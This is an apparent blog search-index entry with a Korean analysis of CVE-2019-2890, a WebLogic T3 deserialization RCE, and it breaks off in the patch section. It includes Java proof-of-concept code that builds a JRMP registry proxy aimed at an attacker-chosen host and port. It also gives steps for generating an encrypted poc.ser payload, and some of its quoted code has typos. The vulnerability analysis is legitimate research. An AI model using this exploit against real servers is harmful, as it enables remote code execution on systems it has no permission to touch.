<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2019-2890 Unserialize RCE in Oracle WebLogic</title>
      <link href="2021/02/10/2021-02-10-CVE-2019-2890/"/>
      <url>2021/02/10/2021-02-10-CVE-2019-2890/</url>
      
        <content type="html"><![CDATA[<p>예전부터 분석을 하고, 글을 작성하려 했지만 게으름 탓인 지 2020년에 할려 했던 걸 지금 하고 있습니다. 이번 취약점은 오라클에서 제공하는 Oracle Fusion Middleware의 웹 로직 서버에서 발견 된 역직렬화 RCE 취약점입니다. 해당 웹 로직 서버에서는 데이터를 T3 프로토콜을 이용해서 전달하는데, 안전하게 전달하기 위해서 <code>Serialize</code> -&gt; <code>encryption</code> -&gt; <code>Decryption</code> -&gt; <code>Unserialize</code>와 같은 과정을 거쳐 전달한다고 합니다. 하지만 데이터에 대한 검증 절차가 존재하지 않아 데이터를 역직렬화 할 때 RCE 취약점이 터지게 됩니다.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-2890</td><td>WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0</td><td>7.2</td></tr></tbody></table><p><br>VE-2019-2890는 WebLogic Server <code>10.3.6.0.0</code>, <code>12.1.3.0.0</code>, <code>12.2.1.3.0</code>에서 모두 발생했고, 2019년 10월 16일에 POC가 공개됐고, 10월에 바로 긴급패치를 발표했다고 합니다.<br></p><hr><h2 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title=" CVE-2019-2890"></a><span style="color:#21C587"></span> CVE-2019-2890</h2><p>취약점은 <code>PersistentContext</code> 클래스에서 발생합니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (SubjectManager.getSubjectManager().isKernelIdentity(<span class="keyword">this</span>._subject)) &#123;</span><br><span class="line">        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span><br><span class="line">        getSubjectManager().getAnonymousSubject();</span><br><span class="line">        var3.writeObject(var4);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var3.writeObject(<span class="keyword">this</span>._subject);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">        var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    &#125;</span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>writeSubject</code> 메서드는 데이터를 직렬화 하고, 암호화하는 메서드입니다. <code>Line 5 ~ 11</code>에서 데이터를 직렬화하고, <code>Line 16 ~ 20</code>까지가 암호화하는 부분입니다. 여기서 직렬화할 때 데이터의 대한 검증 로직만 있었으면 해당 취약점은 터지지 않았을 건데, 검증 로직이 없어 취약점까지 연계가 되었습니다. 이렇게 writeSubject 메소드에서 만들어진 직렬화 데이터는 아까 말한 T3 프로토콜을 이용해서 웹 로직 서버로 전송을 하게 됩니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundExeception </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().lock();</span><br><span class="line">        <span class="keyword">this</span>._propertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._propBagClassNames = (Set)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._contextPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._invocationPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._state = (PersistentContext.State)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>.readsubject(var1);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>직렬화 데이터를 T3 프로토콜로 전송하면 <code>readObject</code> 메서드를 이용해서 받아 <code>readSubject</code> 메서드로 넘겨주는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var2 = var1.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[var2];</span><br><span class="line">        var1.readFully(var3);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            var3 = EncryptionUtil.decrypt(var3);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream var4 = <span class="keyword">new</span> ByteArrayInputStream(var3);</span><br><span class="line">        ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)var5.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>직렬화 데이터는 <code>readObject</code> 메서드에서 <code>readSubject</code> 메서드로 전달해 줘 받게 됩니다. <code>Line 3 ~ 8</code>에서 데이터를 읽고, 복호화를 하고, <code>Line 10 ~ 12</code>에서 역직렬화를 하는데 바로 이때 RCE가 터집니다.<br></p><p>이로서 우리는 <code>PersistentContext</code> 클래스에서는 직렬화한 데이터를 암호화하고, 전송한다는 것을 알고 있습니다. 그렇기 때문 익스플로잇을 하려면 이를 기반으로 POC를 작성해서 직렬화 데이터를 만들어주어야 합니다. </p><hr><h2 id="CVE-2019-2890-POC"><a href="#CVE-2019-2890-POC" class="headerlink" title=" CVE-2019-2890 POC"></a><span style="color:#21C587"></span> CVE-2019-2890 POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.wsee.jaxws.persistence;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.kernel.KernelStatus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span>  </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sep = command.indexOf(<span class="number">58</span>);</span><br><span class="line">            String host;</span><br><span class="line">            <span class="keyword">int</span> port;</span><br><span class="line">            <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                port = (<span class="keyword">new</span> Random()).nextInt(<span class="number">65535</span>);</span><br><span class="line">                host = command;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">                port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ObjID id = <span class="keyword">new</span> ObjID((<span class="keyword">new</span> Random()).nextInt());</span><br><span class="line">            TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">            UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">            RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">            Registry proxy = (Registry)Proxy.newProxyInstance(ysoserial.payloads.JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Registry.class&#125;, obj);</span><br><span class="line">            <span class="keyword">return</span> proxy;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">            PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            objectOutputStream.writeObject(pc);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>위 java code가 main poc 코드입니다. 위 poc 클래스를 이용해 직렬화 데이터를 만들어야 합니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (SubjectManager.getSubjectManager().isKernelIdentity(this._subject)) &#123;</span></span><br><span class="line"><span class="comment">//        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span></span><br><span class="line"><span class="comment">//        getSubjectManager().getAnonymousSubject();</span></span><br><span class="line"><span class="comment">//        var3.writeObject(var4);</span></span><br><span class="line"><span class="comment">//    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//        var3.writeObject(this._subject);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">[+] var3.writeObject(Poc.getObject());</span><br><span class="line"></span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (KernelStatus.isServer()) &#123;</span></span><br><span class="line"><span class="comment">//        var5 = EncryptionUtil.encrypt(var5);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위와 같이 writeSubject 메서드에서 <code>Poc.getObject</code>를 추가하면 됩니다. 하지만 일단 직렬화 데이터를 만들기 전에는 4가지 문제점이 생기는데 이를 모두 해결해줘야 합니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.bea.core.security.managers.NotSupportedException</span><br><span class="line">    at weblogic.security.service.SecurityServiceManager.isKernelIdentity(SecurityServiceManager.java:546)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.PersistenContext.&lt;init&gt;(PersistentContext.java:168)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.Poc2.main(Poc2.java:27)</span><br></pre></td></tr></table></figure><ol><li>첫 번째 오류는 PersistenContext 객체를 만들 때 발생합니다. 이 에러는 PersistenContext를 초기화 중에 호출 하는데 <code>SecurityServiceManager.isKernelIdentity</code> 메서드를 이용해서 커널 ID를 체크하는데 이때 에러를 내뱉고 직렬화를 종료하게 됩니다.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> bollean <span class="title">isKernelIdentity</span><span class="params">(AuthenticatedSubject var0)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> NotSupportedException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isKernelIdentity</code> 메서드에서 <code>NotSupportedException</code> 메서드를 호출하는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PersistenContext(<span class="meta">@NotNull</span> String var1, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var2, <span class="meta">@NotNull</span> Set&lt;String&gt; var3, <span class="meta">@Nullable</span> Map&lt;String, Serializable&gt; var4, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var5) &#123;</span><br><span class="line">    <span class="keyword">super</span>(var1);</span><br><span class="line">    <span class="keyword">this</span>._propertyMap = var2;</span><br><span class="line">    <span class="keyword">this</span>._proBagClassNames = var3;</span><br><span class="line">    <span class="keyword">this</span>._contextPropertyMap = var4;</span><br><span class="line">    <span class="keyword">this</span>._invocationPropertyMap = var5;</span><br><span class="line">    <span class="keyword">this</span>._state = PersistentContext.State.UNUSED;</span><br><span class="line">   AuthenticatedSubject var6 = getCurrentSubject();</span><br><span class="line"><span class="comment">//      if (SecurityServiceManager.isKernelIdentity(var(6)) &#123;</span></span><br><span class="line"><span class="comment">//          throw new IllegalStateException(&quot;Attempt to create PersistentContext using kernel identity. All actions that can create PersistentContext must run as a user principal&quot;);</span></span><br><span class="line"><span class="comment">//      &#125; else &#123;</span></span><br><span class="line"><span class="comment">//          this._subject = var6;</span></span><br><span class="line"><span class="comment">//          this._initTransients();</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">    <span class="keyword">this</span>._subject = var6;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>첫 번재 문제는 위와 같이 <code>PersistenContext</code>에서 <code>isKernelIdentity</code> 메서드를 이용한 조건문을 모두 주석 처리함으로 해결할 수 있습니다.<br></p><ol start="2"><li>두 번째 문제는 <code>deserialization PersistenContext</code> 클래스가 중단되는 것 입니다. </li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersistentContext</span> <span class="keyword">extends</span> <span class="title">AbstractStorable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AuthenticatedSubject KERNEL_ID = (AuthenticatedSubject)AccessController.doPrivileged(PrivilgedActions.getKernelIdentityAction());</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ReentranReadWriteLock _lock;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Serializable&gt; _propertyMap;</span><br><span class="line">    </span><br><span class="line">    (생략)</span><br></pre></td></tr></table></figure><p><code>PersistentContext</code> 클래스를 보면 <code>AuthenticatedSubject</code>를 초기화하는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SubjectManager <span class="title">getSubjectManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object var0 = ceSubjectManagerLock; var0 (slot_0): Object@<span class="number">661</span></span><br><span class="line">    <span class="keyword">synchronized</span>(ceSubjectManagerLock) &#123;</span><br><span class="line">        <span class="keyword">while</span>(ceSubjectManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ceClient) &#123;</span><br><span class="line">                ceSubjectManager = SubjectManagerFactory.getInstance().getSubjectManager();</span><br><span class="line">                <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">             &#125;</span><br><span class="line">             </span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 ceSubjectManagerLock.wait();</span><br><span class="line">             &#125; <span class="keyword">catch</span> (InterruptedException var3) &#123;</span><br><span class="line">                 <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var3);</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AuthenticatedSubject</code>를 초기화 할 때는 위 코드가 실행되는데 <code>ceClient</code>의 값이 <code>True</code>가 아니라면 무한 루프에 빠지는 것을 볼 수 있습니다. <code>ceSubjectManagerLock.wait</code> 메서드에서는 직렬화가 실행되지 않습니다. 그리고 <code>ceClient</code>는 시스템 속성이기 때문에 <code>com.bea.core.internal.client</code>을 이용해서 <code>True</code>를 설정할 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final bollean ceClient &#x3D; &quot;true&quot;.equalsIgnoreCase(System.getProperty( key:&quot;com.bea.core.internal.client&quot;, def:&quot;false&quot;));</span><br></pre></td></tr></table></figure><p>그래서 위와 같이 <code>ceClient</code> 변수를 설정해주면 무한루프에 빠지지 않아 두 번째 문제도 해결할 수 있습니다.<br></p><ol start="3"><li>세 번째 문제는 직렬화 데이터가 암호화되지 않는다는 것 입니다.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] var0) &#123;</span><br><span class="line">    <span class="keyword">return</span> Kernel.isServer() ? getEncryptionService().encryptBytes(var0) : var0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>EncryptionUtilencrypt</code>를 확인해보면 <code>isServer</code> 메서드 값이 참이면 암호화한 값을 넣어주고, 참이 아니면 암호화하지 않고 원본을 반환하는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KernelStatus.setIsServer(true)</span><br></pre></td></tr></table></figure><p>그래서 직렬화 데이터를 암호화하기 전에 위 구문을 정의해줌으로서 <code>isServer</code> 값이 참이 되게 만들면 직렬화 데이터가 잘 암호회되어 세 번째 문제도 해결할 수 있습니다.<br></p><ol start="4"><li>네 번째 문제는 암호화에 사용되는 <code>SerializedSystemIni.dat</code> 파일이 없다는 겁니다. 해당 문제를 해결하기 위해서는 현재 웹 로직에서 사용되고 있는 <code>SerializedSystemIni.dat</code> 파일을 poc 디렉터리에 넣어주면 됩니다.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">    PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">    ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">    objectOutputStream.writeObject(pc);</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4가지의 문제를 모두 해결하였으면 <code>poc.ser</code> 파일을 생성하고, 해당 파일로 익스를 진행하면 RCE를 트리거 할 수 있습니다.</p><hr><h2 id="CVE-2019-2890-Patch"><a href="#CVE-2019-2890-Patch" class="headerlink" title=" CVE-2019-2890 Patch"></a><span style="color:#21C587"></span> CVE-2019-2890 Patch</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream in)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = in.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">        in.readFully(bytes);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            bytes = EncryptionUtil.decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in2 = <span class="keyword">new</span> PersistentContext.WSFilteringObjectInputStream(bais);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)in2.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>패치 코드를 확인해보면 <code>readSubject</code> 메서드에서 데이터를 검증하는 <code>WSFilteringObjectInputStream</code> 메서드를 이용해서 검증하고 있는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> tatic <span class="class"><span class="keyword">class</span> <span class="title">WSFilteringObjectInputStream</span> <span class="keyword">extends</span> <span class="title">FilteringObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String firstClassName;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WSFilteringObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass descriptor) <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        Class clazz = <span class="keyword">super</span>.resloveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.firstClassName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            String className = descriptor.getName();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">        